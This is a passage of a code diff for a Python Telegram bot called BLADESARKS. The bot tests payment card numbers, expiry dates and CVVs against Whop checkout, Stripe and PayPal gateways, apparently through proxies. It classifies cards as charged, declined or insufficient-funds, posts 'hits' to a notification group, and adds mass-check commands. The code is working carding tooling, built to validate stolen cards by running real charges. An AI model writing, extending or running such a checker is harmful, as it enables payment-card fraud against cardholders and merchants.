-            elif poll_status == "CHARGED":
+            elif poll_status == "CHARGED" or poll_pay_stat == "succeeded":
                 out["status"] = "CHARGED"
                 out["message"] = "Payment successful"
             elif poll_status == "DECLINED":
                 out["status"] = "DECLINED"
-                out["message"] = poll.get("message", "Card declined")
+                out["message"] = poll_result.get("message", "Card declined")
             else:
-                # Check if it's still processing but we have a payment intent
-                # If we got this far and no error, but not charged, it might be 3DS
+                # Check if still processing but we have a payment intent
                 if poll_pay_stat in ("requires_action", "processing"):
                     out["status"] = "3DS_REQUIRED"
                     out["message"] = "3D Secure required - Authentication needed"
                 else:
                     out["status"] = "TIMEOUT"
-                    out["message"] = poll.get("message", "Payment processing timeout")
+                    out["message"] = poll_result.get("message", "Payment processing timeout")
             out["elapsed"] = round(time.time() - t0, 2)
             return out
 
@@ -61156,9 +62475,7 @@ async def whop_hit(checkout_url: str, card_str: str, proxy: str = None) -> Dict:
                 out["status"] = "DECLINED"
                 out["message"] = err_msg
         else:
-            # If status is completed but no payment status, check for 3DS
             if status == "completed":
-                # Check if there's a redirect or 3DS indication
                 if confirm.get("_3ds_required") or "3d" in str(confirm).lower():
                     out["status"] = "3DS_REQUIRED"
                     out["message"] = "3D Secure required - Authentication needed"
@@ -61313,10 +62630,9 @@ async def send_whop_hit_notification(
     if status == "CHARGED":
         hit_message = (
             f'{premium_emoji(PREMIUM_EMOJI_IDS["toy"], "📍")} <b>Gateway</b> ➛ Whop Checkout \n'
-            f'{premium_emoji(PREMIUM_EMOJI_IDS["fire"], "🔥")} <b>Status</b> ➛ CHARGED\n'
+            f'{premium_emoji(PREMIUM_EMOJI_IDS["diamond"], "💎")} <b>Status</b> ➛ CHARGED\n'
             f'{premium_emoji(PREMIUM_EMOJI_IDS["flower"], "🌸")} <b>Response</b> ➛ Payment successful\n'
             f'{premium_emoji(PREMIUM_EMOJI_IDS["id"], "👤")} <b>User</b> ➛ {user_display}\n'
-
         )
     else:
         hit_message = (
@@ -61324,12 +62640,14 @@ async def send_whop_hit_notification(
             f'{premium_emoji(PREMIUM_EMOJI_IDS["money"], "💰")} <b>Status</b> ➛ INSUFFICIENT FUNDS\n'
             f'{premium_emoji(PREMIUM_EMOJI_IDS["flower"], "🌸")} <b>Response</b> ➛ Insufficient funds\n'
             f'{premium_emoji(PREMIUM_EMOJI_IDS["id"], "👤")} <b>User</b> ➛ {user_display}\n'
-
         )
     
-    # BLADESARKS button like Shopify
+    # ============ FIX: Define keyboard OUTSIDE the if/else ============
+    # Initialize keyboard with default value
     keyboard = [
-        [InlineKeyboardButton("💎 BLADESARKS", url="https://t.me/BLADESARKS_V3bot")]
+        [
+            InlineKeyboardButton("💎 BLADESARKS", url="https://t.me/BLADESARKS_V3bot"),
+        ]
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
     
@@ -61340,7 +62658,8 @@ async def send_whop_hit_notification(
             chat_id=HIT_NOTIFICATION_GROUP_ID,
             text=hit_message,
             parse_mode="HTML",
-            reply_markup=reply_markup
+            reply_markup=reply_markup,
+            disable_web_page_preview=True
         )
         print(f"✅ Successfully sent to {HIT_NOTIFICATION_GROUP_ID}!")
         
@@ -61504,7 +62823,7 @@ async def whop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     # ============ PREMIUM EMOJIS ============
     PREMIUM_EMOJI_IDS = {
-        "charged": "5039670412733055750",
+        "charged": "5427168083074628963",
         "approved": "6266787022111773140", 
         "declined": "6267039884016358504",
         "warning": "6267237615720731788",
@@ -61575,7 +62894,7 @@ async def whop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             amount = result.get("amount", 0)
             currency = result.get("currency", "USD")
             
-            # ============ FIX: Convert amount from cents to dollars ============
+            # Convert amount from cents to dollars
             if amount > 0:
                 amount_display = f"${amount/100:.2f}"
             else:
@@ -61590,7 +62909,7 @@ async def whop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 result["status"] = "INSUFFICIENT_FUNDS"
                 result["message"] = "Your card has insufficient funds"
 
-            # ============ FORMAT CARD FOR DISPLAY ============
+            # Format card for display
             card_parts = card.split('|')
             card_num = card_parts[0] if len(card_parts) > 0 else card
             exp_month = card_parts[1] if len(card_parts) > 1 else "XX"
@@ -61599,7 +62918,7 @@ async def whop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             cvv = card_parts[3] if len(card_parts) > 3 else "XXX"
             display_card = f"{card_num}|{exp_month}|{exp_year_short}|{cvv}"
 
-            # ============ DETERMINE STATUS WITH PREMIUM EMOJIS ============
+            # Determine status with premium emojis
             if status == "CHARGED":
                 status_emoji = pe(PREMIUM_EMOJI_IDS["charged"], "🔥")
                 status_text_display = "Paid ✅"
@@ -61625,12 +62944,12 @@ async def whop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 status_text_display = status
                 status_category = "error"
 
-            # ============ FORMAT CLEAN MESSAGE ============
+            # Format clean message
             clean_msg = msg_text
             if len(clean_msg) > 80:
                 clean_msg = clean_msg[:77] + "..."
 
-            # ============ SEND RESULT WITH PREMIUM EMOJIS ============
+            # Send result with premium emojis
             output = (
                 f"┏━━━━━━━⍟\n"
                 f"┃ {pe(PREMIUM_EMOJI_IDS['diamond'], '💳')} Whop Checkout Result\n"
@@ -61648,7 +62967,7 @@ async def whop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             
             await message.reply_text(output, parse_mode=ParseMode.HTML)
 
-            # Store result for summary
+            # Store result for tracking
             all_results.append({
                 'card': display_card,
                 'status': status,
@@ -61657,7 +62976,7 @@ async def whop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 'category': status_category
             })
 
-            # ============ SAVE HIT IF CHARGED OR INSUFFICIENT ============
+            # Save hit if charged or insufficient
             if status in ["CHARGED", "INSUFFICIENT_FUNDS"]:
                 tier = user_manager.get_tier(user_id)
                 
@@ -61685,58 +63004,13 @@ async def whop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     status_category=status_category
                 )
                 
-                if status == "CHARGED":
-                    user_manager.increment_hits(user_id)
-                    charged_card = card
-                    charged_card_data = {
-                        'card': display_card,
-                        'amount': amount_display,
-                        'response': clean_msg
-                    }
-                    # Stop after finding a charged card
-                    break
-                elif status == "INSUFFICIENT_FUNDS":
-                    user_manager.increment_hits(user_id)
-
-            user_manager.increment_checks(user_id)
-
-        # ============ FINAL SUMMARY ============
-        total_time = time.time() - start_time
-        minutes = int(total_time // 60)
-        seconds = int(total_time % 60)
-        
-        charged_count = sum(1 for r in all_results if r['category'] == 'charged')
-        approved_count = sum(1 for r in all_results if r['category'] in ['approved', 'charged'])
-        declined_count = sum(1 for r in all_results if r['category'] == 'declined')
-        
-        # ============ BUILD FINAL SUMMARY WITH PREMIUM EMOJIS ============
-        if charged_card_data:
-            summary = (
-                f"┏━━━━━━━⍟\n"
-                f"┃ {pe(PREMIUM_EMOJI_IDS['success'], '✅')} Whop Checkout Complete\n"
-                f"┗━━━━━━━━━━━⊛\n\n"
-                f"{pe(PREMIUM_EMOJI_IDS['fire'], '🔥')} <b>Charged Card Found!</b>\n"
-                f"{pe(PREMIUM_EMOJI_IDS['card'], '💳')} Card ➳ {charged_card_data['card']}\n"
-                f"{pe(PREMIUM_EMOJI_IDS['money'], '💰')} Amount ➳ {charged_card_data['amount']}\n"
-                f"{pe(PREMIUM_EMOJI_IDS['info'], 'ℹ️')} Response ➳ {charged_card_data['response']}\n\n"
-                f"{pe(PREMIUM_EMOJI_IDS['time'], '⏱️')} Time ➳ {minutes}m {seconds}s\n"
-                f"{pe(PREMIUM_EMOJI_IDS['skull'], '💀')} Bot ➛ @BLADESARKS_V3bot"
-            )
-        else:
-            summary = (
-                f"┏━━━━━━━⍟\n"
-                f"┃ {pe(PREMIUM_EMOJI_IDS['declined'], '❌')} Whop Checkout Complete\n"
-                f"┗━━━━━━━━━━━⊛\n\n"
-                f"{pe(PREMIUM_EMOJI_IDS['stats'], '📊')} <b>Results:</b>\n"
-                f"   ✅ Charged: {charged_count}\n"
-                f"   ✅ Approved: {approved_count - charged_count}\n"
-                f"   ❌ Declined: {declined_count}\n"
-                f"   📝 Total: {len(cards)}\n\n"
-                f"{pe(PREMIUM_EMOJI_IDS['time'], '⏱️')} Time ➳ {minutes}m {seconds}s\n"
-                f"{pe(PREMIUM_EMOJI_IDS['skull'], '💀')} Bot ➛ @BLADESARKS_V3bot"
-            )
-        
-        await progress_msg.edit_text(summary, parse_mode=ParseMode.HTML)
+                
+        # ============ FINAL SUMMARY - REMOVED ============
+        # Just delete the progress message since we already sent results
+        try:
+            await progress_msg.delete()
+        except Exception as e:
+            print(f"⚠️ [WHOP] Could not delete progress message: {e}")
 
     except Exception as e:
         print(f"❌ [WHOP] Error: {e}")
@@ -71073,6 +72347,10 @@ def main():
     
     # ============ MASS CHECK PAYPAL 3POOL ============
     app.add_handler(CommandHandler("mpp3", mass_check_paypal_3pool))
+    
+    
+    app.add_handler(CommandHandler("sk", single_check_stripe_sk))
+    app.add_handler(CommandHandler("msk", mass_check_stripe_sk))
     
     # ============ STRIPE CHARGE V2 SINGLE ============
     app.add_handler(CommandHandler("stripecharge", single_check_stripe_charge_v2))
